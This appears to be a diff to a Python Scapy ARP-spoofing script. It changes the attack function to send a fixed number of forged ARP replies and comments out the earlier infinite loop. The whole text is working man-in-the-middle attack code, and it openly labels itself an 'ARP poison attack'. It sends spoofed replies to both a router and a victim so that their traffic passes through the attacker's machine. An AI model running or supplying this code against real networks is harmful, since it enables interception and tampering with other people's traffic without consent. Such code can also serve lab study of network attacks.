@@ -47,19 +47,19 @@ def restoring(ip_router, mac_router, ip_vic, mac_vic):
     print("[*] Disabling IP forwarding")
 
 
-def arp_spoofing(ip_router, mac_router, ip_vic, mac_vic, silent):
+def arp_spoofing(ip_router, mac_router, ip_vic, mac_vic, silent, number):
     s = silent
     mac_me = my_mac()
     print("[*] Started ARP poison attack [CTRL-C to stop]")
     try:
-        if s:
+        for i in range(0, number):
             send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
             send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
             time.sleep(2)
-        while s==False:
-            send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
-            send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
-            time.sleep(2)
+        # while s==False:
+        #     send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
+        #     send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
+        #     time.sleep(2)
     except KeyboardInterrupt:
         print("[*] Stopped ARP poison attack. Restoring network")
         restoring(ip_router, mac_router, ip_vic, mac_vic)
